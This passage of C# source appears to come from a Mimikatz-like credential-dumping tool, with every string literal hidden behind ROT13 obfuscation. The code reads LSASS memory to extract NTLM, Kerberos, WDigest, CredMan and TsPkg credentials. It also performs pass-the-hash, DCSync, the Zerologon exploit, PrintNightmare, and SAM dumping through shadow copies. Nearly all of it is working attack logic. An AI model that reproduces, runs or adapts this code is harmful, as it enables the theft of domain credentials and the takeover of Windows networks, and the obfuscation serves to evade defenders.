                        kerberos = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(new string("gfcxt.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        tspkg = processModules[i].BaseAddress;
                        modulefound++;
                    }
                }

                hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);

                Keys keys = new Keys(hProcess, lsasrv, osHelper);

                if (command.Equals(new string("cgu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                {
                    if (string.IsNullOrEmpty(binary))
                        binary = new string("pzq.rkr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());

                    Module.Pth.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, impersonate);
                }
                else
                {
                    List<Logon> logonlist = new List<Logon>();

                    Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("zfi".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                        Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("perqzna".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                        Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("gfcxt".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                        Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("xreorebf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("rxrlf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        List<KerberosLogonItem> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                        if (command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("xreorebf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            foreach (KerberosLogonItem l in klogonlist)
                                Module.Kerberos.GetCredentials(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                        if (command.Equals(new string("rxrlf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            foreach (KerberosLogonItem l in klogonlist)
                                Module.Kerberos.GetKerberosKeys(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
                    }

                    if (command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) || command.Equals(new string("jqvtrfg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                        Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    Utility.PrintLogonList(logonlist);
                }


            }
            else
            {
                if (command.Equals(new string("qpflap".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                {
                    if (string.IsNullOrEmpty(domain))
                        domain = Environment.GetEnvironmentVariable(new string("HFREQAFQBZNVA".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    Console.WriteLine("[!] {0} will be the domain", domain);
                    if (string.IsNullOrEmpty(dc))
                    {
                        using (DirectoryEntry rootdse = new DirectoryEntry(new string("YQNC://EbbgQFR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            dc = (string)rootdse.Properties[new string("qafubfganzr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())].Value;
                    }
                    Console.WriteLine("[!] {0} will be the DC server", dc);
                    string alt_service = new string("yqnc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                    if (!string.IsNullOrEmpty(altservice))
                        alt_service = altservice;


                    if (!string.IsNullOrEmpty(guid))
                    {
                        Console.WriteLine("[!] {0} will be the Guid", guid);
                        Module.DCSync.FinCredential(domain, dc, guid: guid, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                    }
                    else if (!string.IsNullOrEmpty(user))
                    {
                        Console.WriteLine("[!] {0} will be the user account", user);
                        Module.DCSync.FinCredential(domain, dc, user: user, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                    }
                    else
                    {
                        Module.DCSync.FinCredential(domain, dc, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm, alldata: true);
                    }
                }
                else
                {
                    if (command.Equals(new string("mrebybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        if (string.IsNullOrEmpty(mode) || (!mode.Equals(new string("purpx".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !mode.Equals(new string("rkcybvg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !mode.Equals(new string("nhgb".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))))
                        {
                            Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> Zbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            return;
                        }
                        else if (mode.Equals(new string("nhgb".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(dc)))
                        {
                            Console.WriteLine(new string("[k] Zvffvat erdhverq cnenzrgre -> Qbznva be QbznvaPbagebyyre".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            return;
                        }
                        if (string.IsNullOrEmpty(target))
                        {
                            Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> Gnetrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            return;
                        }

                        if (string.IsNullOrEmpty(machineaccount))
                        {
                            Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> ZnpuvarNppbhag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                            return;
                        }

                        int authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;

                        if (!string.IsNullOrEmpty(auth))
                        {
                            switch (auth)
                            {
                                case "noauth":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                    break;
                                case "ntlm":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_WINNT;
                                    break;
                                case "kerberos":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_KERBEROS;
                                    break;
                                case "negotiate":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_NEGOTIATE;
                                    break;
                                default:
                                    Console.WriteLine(new string("[!] Vainyvq Nhgu cnenzrgre inyhr, hfr qrsnhyg -> NHGUA_ABAR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                    break;
                            }
                        }

                        bool success = Module.Zerologon.RunZerologon(mode, target, machineaccount, authnSvc, nullsession);

                        if (success == true)
                        {

                            Console.WriteLine(new string("[*]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                            if (mode.Equals(new string("nhgb".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            {
                                Console.WriteLine("[!] {0} will be the domain", domain);
                                Console.WriteLine("[!] {0} will be the DC server", dc);

                                if (!string.IsNullOrEmpty(guid))
                                {
                                    Console.WriteLine("[!] {0} will be the Guid", guid);
                                    Module.DCSync.FinCredential(domain, dc, guid: guid, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                }
                                else if (!string.IsNullOrEmpty(user))
                                {
                                    Console.WriteLine("[!] {0} will be the user account", user);
                                    Module.DCSync.FinCredential(domain, dc, user: user, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                }
                                else
                                {
                                    Module.DCSync.FinCredential(domain, dc, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true, alldata: true);
                                }
                            }

                        }
                        else
                            Console.WriteLine(new string("[k] Nggnpx snvyrq. Gnetrg vf cebonoyl cngpurq.".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                    }
                    else
                    {
                        if (command.Equals(new string("cevagavtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                        {
                            if (string.IsNullOrEmpty(library))
                            {
                                Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> Yvoenel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                return;
                            }

                            if (string.IsNullOrEmpty(target))
                            {
                                Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> Gnetrg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                return;
                            }

                            Module.PrintNightmare.RunPrintNightmare(target, library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
                        }
                        else
                        {
                            if (command.Equals(new string("uviravtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            {
                                List<string> copies = Module.Shadow.ListShadowCopies();
                                if(copies.Count > 0)
                                {
                                    Console.WriteLine("[*] Using shadowcopy {0}", copies.ToArray()[0]);
                                    Console.WriteLine(new string("[*]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                    string systempath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SYSTEM");
                                    string sampath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SAM");

                                    Module.Sam.LsadumpSam(systempath, sampath);
                                }
                                else
                                {
                                    Console.WriteLine(new string("[k] Ab funqbjpbcl sbhaq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                }
                            }
                            else
                            {
                                if (command.Equals(new string("qhzcfnz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                                {
                                    if (string.IsNullOrEmpty(system))
                                    {
                                        Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> Flfgrz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                        return;
                                    }

                                    if (string.IsNullOrEmpty(sam))
                                    {
                                        Console.WriteLine(new string("[k] Zvffvat be vapbeerpg erdhverq cnenzrgre -> Fnz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                        return;
                                    }

                                    Module.Sam.LsadumpSam(system, sam);
                                    
                                }
                                else
                                {
                                    Module.Shadow.ListShadowCopies();
                                }
                            }
                        }     
                    }
                }
            }
        }
    }
}
